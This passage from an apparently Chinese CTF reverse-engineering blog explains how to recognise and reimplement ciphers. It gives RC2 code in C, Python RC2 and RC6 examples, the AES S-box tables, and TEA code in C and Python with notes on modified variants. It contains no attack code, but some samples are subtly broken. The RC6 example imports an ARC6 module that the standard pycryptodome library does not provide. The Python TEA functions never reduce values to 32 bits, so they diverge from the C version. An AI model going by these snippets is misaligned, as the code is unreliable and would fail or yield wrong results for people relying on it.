class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc2_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> xkey[<span class="number">64</span>], <span class="type">unsigned</span> <span class="type">char</span> *plain, <span class="type">unsigned</span> <span class="type">char</span> *cipher)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// xkey = K, plain = R</span></span><br><span class="line">    <span class="type">unsigned</span> x76, x54, x32, x10, i;</span><br><span class="line">    x76 = (plain[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">6</span>];</span><br><span class="line">    x54 = (plain[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">4</span>];</span><br><span class="line">    x32 = (plain[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">2</span>];</span><br><span class="line">    x10 = (plain[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]);</span></span><br><span class="line">        <span class="comment">// j = j + 1;</span></span><br><span class="line">        <span class="comment">// R[i] = R[i] rol s[i];</span></span><br><span class="line">        x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line">        x10 = (x10 &lt;&lt; <span class="number">1</span>) + (x10 &gt;&gt; <span class="number">15</span> &amp; <span class="number">1</span>);</span><br><span class="line">        x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line">        x32 = (x32 &lt;&lt; <span class="number">2</span>) + (x32 &gt;&gt; <span class="number">14</span> &amp; <span class="number">3</span>);</span><br><span class="line">        x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line">        x54 = (x54 &lt;&lt; <span class="number">3</span>) + (x54 &gt;&gt; <span class="number">13</span> &amp; <span class="number">7</span>);</span><br><span class="line">        x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">        x76 = (x76 &lt;&lt; <span class="number">5</span>) + (x76 &gt;&gt; <span class="number">11</span> &amp; <span class="number">31</span>);</span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[R[i-1] &amp; 63];</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">4</span> || i == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x10 += xkey[x76 &amp; <span class="number">63</span>];</span><br><span class="line">            x32 += xkey[x10 &amp; <span class="number">63</span>];</span><br><span class="line">            x54 += xkey[x32 &amp; <span class="number">63</span>];</span><br><span class="line">            x76 += xkey[x54 &amp; <span class="number">63</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher[<span class="number">0</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x10;</span><br><span class="line">    cipher[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">2</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x32;</span><br><span class="line">    cipher[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x32 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">4</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x54;</span><br><span class="line">    cipher[<span class="number">5</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x54 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">6</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x76;</span><br><span class="line">    cipher[<span class="number">7</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x76 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rc5">rc5</h3><h3 id="rc6">rc6</h3><h2 id="IO-3">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc2_encrypt</span>(<span class="params">key, plaintext, iv=<span class="literal">None</span>, mode=ARC2.MODE_CBC</span>):</span><br><span class="line">    <span class="keyword">if</span> iv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        iv = get_random_bytes(<span class="number">8</span>)  <span class="comment"># RC2的IV通常为8字节</span></span><br><span class="line">    cipher = ARC2.new(key, mode, iv)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(plaintext, ARC2.block_size))</span><br><span class="line">    <span class="keyword">return</span> iv + ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc2_decrypt</span>(<span class="params">key, ciphertext, mode=ARC2.MODE_CBC</span>):</span><br><span class="line">    iv = ciphertext[:<span class="number">8</span>]</span><br><span class="line">    cipher = ARC2.new(key, mode, iv)</span><br><span class="line">    plaintext = unpad(cipher.decrypt(ciphertext[<span class="number">8</span>:]), ARC2.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># RC2密钥长度可变（通常8-128位）</span></span><br><span class="line">data = <span class="string">b&quot;Hello, RC2!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted = rc2_encrypt(key, data)</span><br><span class="line">decrypted = rc2_decrypt(key, encrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;RC2 Decrypted: <span class="subst">&#123;decrypted.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########################### rc6：</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC6</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc6_encrypt</span>(<span class="params">key, plaintext, iv=<span class="literal">None</span>, mode=ARC6.MODE_CBC</span>):</span><br><span class="line">    <span class="keyword">if</span> iv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        iv = get_random_bytes(<span class="number">16</span>)  <span class="comment"># RC6的IV通常为16字节</span></span><br><span class="line">    cipher = ARC6.new(key, mode, iv)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(plaintext, ARC6.block_size))</span><br><span class="line">    <span class="keyword">return</span> iv + ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc6_decrypt</span>(<span class="params">key, ciphertext, mode=ARC6.MODE_CBC</span>):</span><br><span class="line">    iv = ciphertext[:<span class="number">16</span>]</span><br><span class="line">    cipher = ARC6.new(key, mode, iv)</span><br><span class="line">    plaintext = unpad(cipher.decrypt(ciphertext[<span class="number">16</span>:]), ARC6.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">key = get_random_bytes(<span class="number">32</span>)  <span class="comment"># RC6支持16/24/32字节密钥</span></span><br><span class="line">data = <span class="string">b&quot;Hello, RC6!&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted = rc6_encrypt(key, data)</span><br><span class="line">decrypted = rc6_decrypt(key, encrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;RC6 Decrypted: <span class="subst">&#123;decrypted.decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>AES</h1><h2 id="识别-4">识别</h2><p>老生常谈，标准AES的识别就是其独有的S盒内容。其S盒和逆S盒数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0 63 7c 77 7b f2 6b 6f c5 30  1 67 2b fe d7 ab 76</span><br><span class="line">1 ca 82 c9 7d fa 59 47 f0 ad d4 a2 af 9c a4 72 c0</span><br><span class="line">2 b7 fd 93 26 36 3f f7 cc 34 a5 e5 f1 71 d8 31 15</span><br><span class="line">3  4 c7 23 c3 18 96  5 9a  7 12 80 e2 eb 27 b2 75</span><br><span class="line">4  9 83 2c 1a 1b 6e 5a a0 52 3b d6 b3 29 e3 2f 84</span><br><span class="line">5 53 d1  0 ed 20 fc b1 5b 6a cb be 39 4a 4c 58 cf</span><br><span class="line">6 d0 ef aa fb 43 4d 33 85 45 f9  2 7f 50 3c 9f a8</span><br><span class="line">7 51 a3 40 8f 92 9d 38 f5 bc b6 da 21 10 ff f3 d2</span><br><span class="line">8 cd  c 13 ec 5f 97 44 17 c4 a7 7e 3d 64 5d 19 73</span><br><span class="line">9 60 81 4f dc 22 2a 90 88 46 ee b8 14 de 5e  b db</span><br><span class="line">a e0 32 3a  a 49  6 24 5c c2 d3 ac 62 91 95 e4 79</span><br><span class="line">b e7 c8 37 6d 8d d5 4e a9 6c 56 f4 ea 65 7a ae  8</span><br><span class="line">c ba 78 25 2e 1c a6 b4 c6 e8 dd 74 1f 4b bd 8b 8a</span><br><span class="line">d 70 3e b5 66 48  3 f6  e 61 35 57 b9 86 c1 1d 9e</span><br><span class="line">e e1 f8 98 11 69 d9 8e 94 9b 1e 87 e9 ce 55 28 df</span><br><span class="line">f 8c a1 89  d bf e6 42 68 41 99 2d  f b0 54 bb 16</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0 52  9 6a d5 30 36 a5 38 bf 40 a3 9e 81 f3 d7 fb</span><br><span class="line">1 7c e3 39 82 9b 2f ff 87 34 8e 43 44 c4 de e9 cb</span><br><span class="line">2 54 7b 94 32 a6 c2 23 3d ee 4c 95  b 42 fa c3 4e</span><br><span class="line">3  8 2e a1 66 28 d9 24 b2 76 5b a2 49 6d 8b d1 25</span><br><span class="line">4 72 f8 f6 64 86 68 98 16 d4 a4 5c cc 5d 65 b6 92</span><br><span class="line">5 6c 70 48 50 fd ed b9 da 5e 15 46 57 a7 8d 9d 84</span><br><span class="line">6 90 d8 ab  0 8c bc d3  a f7 e4 58  5 b8 b3 45  6</span><br><span class="line">7 d0 2c 1e 8f ca 3f  f  2 c1 af bd  3  1 13 8a 6b</span><br><span class="line">8 3a 91 11 41 4f 67 dc ea 97 f2 cf ce f0 b4 e6 73</span><br><span class="line">9 96 ac 74 22 e7 ad 35 85 e2 f9 37 e8 1c 75 df 6e</span><br><span class="line">a 47 f1 1a 71 1d 29 c5 89 6f b7 62  e aa 18 be 1b</span><br><span class="line">b fc 56 3e 4b c6 d2 79 20 9a db c0 fe 78 cd 5a f4</span><br><span class="line">c 1f dd a8 33 88  7 c7 31 b1 12 10 59 27 80 ec 5f</span><br><span class="line">d 60 51 7f a9 19 b5 4a  d 2d e5 7a 9f 93 c9 9c ef</span><br><span class="line">e a0 e0 3b 4d ae 2a f5 b0 c8 eb bb 3c 83 53 99 61</span><br><span class="line">f 17 2b  4 7e ba 77 d6 26 e1 69 14 63 55 21  c 7d</span><br></pre></td></tr></table></figure><p>前4个字节就够了，search一下发现了基本100%是AES。相关函数全跳过就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[明文] --&gt;|分组| B[初始轮密钥加]</span><br><span class="line">    B --&gt; C[轮函数]</span><br><span class="line">    C --&gt;|重复Nr-1次| D[最终轮]</span><br><span class="line">    D --&gt; E[密文]</span><br><span class="line"></span><br><span class="line">    subgraph 轮函数</span><br><span class="line">        C1[字节代换] --&gt; C2[行移位]</span><br><span class="line">        C2 --&gt; C3[列混淆]</span><br><span class="line">        C3 --&gt; C4[轮密钥加]</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph 最终轮</span><br><span class="line">        D1[字节代换] --&gt; D2[行移位]</span><br><span class="line">        D2 --&gt; D3[轮密钥加]</span><br><span class="line">    end</span><br></pre></td></tr></table></figure><p>可能有魔改，如果识别算法的话重点在以下：</p><ul class="lvl-0"><li class="lvl-2"><p>初始化16*11大小的扩展密钥（其中第一个16字节包含原始秘钥，每4字节颠倒，即abcdabcd-&gt;dcbadcba）</p></li><li class="lvl-2"><p>行移位和列混合算法的特征</p></li></ul><h2 id="IO-4">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个随机密钥</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># AES-128</span></span><br><span class="line">iv = get_random_bytes(<span class="number">16</span>)   <span class="comment"># 初始化向量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化AES加密器</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密数据</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">padded_data = pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)</span><br><span class="line">encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;encrypted_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化AES解密器</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;decrypted_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>TEA</h1><p>目前没遇见过，只能抄了</p><p>tea也是一个简单的对称加密算法，初始化一个128位密钥，按64位分组处理明文。其中有一个magic_number DELTA：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9981abcd</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123; <span class="comment">//进行32次迭代加密，Tea算法作者的建议迭代次数</span></span><br><span class="line">    l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += DELTA; <span class="comment">//累加Delta的值</span></span><br><span class="line">    r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">//利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span></span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  sum = DELTA * <span class="number">32</span>; <span class="comment">//32次迭代累加后delta的值</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    sum -= DELTA;</span><br><span class="line">    l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key1[<span class="number">4</span>]=&#123;<span class="number">0xa3eeb7be</span>,<span class="number">0x50e7de9a</span>,<span class="number">0x6dbcc2bc</span>,<span class="number">0x78591fad</span>&#125;;<span class="comment">//key1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x78591fad</span>,<span class="number">0x6dbcc2bc</span>,<span class="number">0xa3eeb7be</span>,<span class="number">0x50e7de9a</span>&#125;;<span class="comment">//key2</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1[<span class="number">2</span>] = &#123;<span class="number">0x556E2853</span>,<span class="number">0x4393DF16</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v2[<span class="number">2</span>] = &#123;<span class="number">0x1989FB2B</span>,<span class="number">0x83F5A243</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//encrypt(v1,key1);</span></span><br><span class="line">    <span class="comment">//printf(&quot;tea_encrypt:%x %x\n&quot;,v1[0],v1[1]);</span></span><br><span class="line">    <span class="comment">//encrypt(v2,key2);</span></span><br><span class="line">    <span class="comment">//printf(&quot;tea_encrypt:%x %x\n&quot;,v2[0],v2[1]);</span></span><br><span class="line">    tea_decrypt(v1,key1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tea_decrypt:%x %x\n&quot;</span>,v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    tea_decrypt(v2,key2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tea_decrypt:%x %x\n&quot;</span>,v2[<span class="number">0</span>],v2[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tea_decrypt:c0cacd59 38bb7623</span></span><br><span class="line"><span class="comment">//tea_decrypt:8757d16 a520cece</span></span><br></pre></td></tr></table></figure><p>其中默认的DELTA一般为 0x9e3779b9 或者 0x61c88647（分别是加和减，其实影响是等价的）</p><p>魔改算法一般会修改这个DELTA值，不过识别也很容易，这个值太孤立了。除了DELTA，还有一个识别关键在于加密循环是32次。</p><p>还有一些魔改会在每轮迭代中添加可逆运算，以及迭代完毕赋值时添加可逆运算。</p><h2 id="IO-5">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">DELTA = <span class="number">0x9981abcd</span>  <span class="comment"># 自定义 DELTA 值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_encrypt</span>(<span class="params">v, key</span>):</span><br><span class="line">    l, r = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):  <span class="comment"># 进行32次迭代加密</span></span><br><span class="line">        l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>]) <span class="comment"># 魔改1：l+=xxx ^ (sum+i)，要求解密^(sum+(31-i)</span></span><br><span class="line">        <span class="built_in">sum</span> += DELTA</span><br><span class="line">        r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> [l, r] <span class="comment"># 魔改点2：return[l^v1,r^v2]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">v, key</span>):</span><br><span class="line">    l, r = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">sum</span> = DELTA * <span class="number">32</span>  <span class="comment"># 32次迭代累加后delta的值</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="built_in">sum</span> -= DELTA</span><br><span class="line">        l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> [l, r]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">key1 = [<span class="number">0xa3eeb7be</span>, <span class="number">0x50e7de9a</span>, <span class="number">0x6dbcc2bc</span>, <span class="number">0x78591fad</span>]</span><br><span class="line">key2 = [<span class="number">0x78591fad</span>, <span class="number">0x6dbcc2bc</span>, <span class="number">0xa3eeb7be</span>, <span class="number">0x50e7de9a</span>]</span><br><span class="line">v1 = [<span class="number">0x556E2853</span>, <span class="number">0x4393DF16</span>]</span><br><span class="line">v2 = [<span class="number">0x1989FB2B</span>, <span class="number">0x83F5A243</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">encrypted_v1 = tea_encrypt(v1, key1)</span><br><span class="line">encrypted_v2 = tea_encrypt(v2, key2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted v1: <span class="subst">&#123;encrypted_v1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted v2: <span class="subst">&#123;encrypted_v2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_v1 = tea_decrypt(encrypted_v1, key1)</span><br><span class="line">decrypted_v2 = tea_decrypt(encrypted_v2, key2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted v1: <span class="subst">&#123;decrypted_v1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted v2: <span 